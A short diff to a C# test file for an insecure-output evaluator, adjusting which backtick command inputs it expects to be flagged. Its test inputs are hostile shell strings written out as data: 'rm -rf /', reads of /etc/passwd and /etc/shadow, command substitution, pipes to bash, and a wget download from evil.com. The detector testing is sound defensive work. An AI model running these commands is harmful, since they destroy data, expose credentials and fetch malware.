@@ -148,7 +148,8 @@ public sealed class InsecureOutputEvaluatorTests
     [InlineData("; rm -rf /")]
     [InlineData("; cat /etc/passwd")]
     [InlineData("$(whoami)")]
-    [InlineData("`id`")]
+    [InlineData("`cat /etc/shadow`")] // rev5-R8: a backtick with a real payload still hits; a bare `id`/`pwd`/`ls` (no
+                                      // args/path/metachar) is ambiguous inline-code documentation and now defers.
     [InlineData("| bash")]
     [InlineData("| powershell")]
     [InlineData("wget http://evil.com/malware")]
